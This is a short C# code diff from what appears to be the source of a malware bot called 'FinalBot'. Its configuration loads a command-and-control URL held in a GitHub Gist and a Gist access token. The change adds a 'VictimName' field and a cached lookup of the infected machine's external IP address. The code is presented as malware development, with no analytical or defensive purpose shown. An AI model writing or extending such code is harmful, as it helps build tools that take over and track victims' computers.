@@ -15,9 +15,20 @@ namespace FinalBot
             _config["ADMIN_ID"] = SafetyManager.GetSecret("ADMIN_ID");
             _config["C2_URL"] = SafetyManager.GetSecret("GIST_URL");
             _config["GIST_GITHUB_TOKEN"] = SafetyManager.GetSecret("GIST_GITHUB_TOKEN");
+            _config["VictimName"] = "Unknown";
             
             Logger.Info("[CONFIG] Application configuration loaded.");
         }
+
+        public static string VictimName 
+        { 
+            get => Get("VictimName", "Unknown"); 
+            set => Set("VictimName", value); 
+        }
+
+        private static string _cachedIp = null;
+        public static string LastKnownIp => _cachedIp ??= FinalBot.Modules.SystemInfoModule.GetExternalIP();
+
 
         public static string Get(string key, string defaultValue = "")
         {
